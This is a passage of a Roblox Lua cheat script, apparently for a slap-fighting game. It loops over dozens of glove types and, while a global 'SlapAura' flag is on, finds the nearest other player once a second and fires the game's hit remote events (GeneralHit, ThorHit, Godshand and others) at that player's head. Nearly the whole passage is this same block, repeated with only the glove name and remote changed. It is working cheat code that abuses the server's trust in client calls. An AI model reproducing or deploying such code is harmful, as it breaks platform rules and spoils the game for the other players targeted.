                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Baller" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Home Run" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Whirlwind" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Slicer" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Excavator" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Nightmare" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("nightmarehit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Thor" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("ThorHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Pocket" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Grapple" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Cloud" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("CloudHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Gravity" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Parry" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Jebaited" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Meteor" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Oven" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Guardian Angel" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Sun" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Ferryman" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Blackhole" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Blink" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Prop" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Slapstick" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Beatdown" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Chicken" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "BONK" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Sbeve" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Golem" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Grab" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "God's Hand" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("Godshand"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "The Flex" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("FlexHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Error" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("Errorhit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "spin" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("spinhit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                      elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Tycoon" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
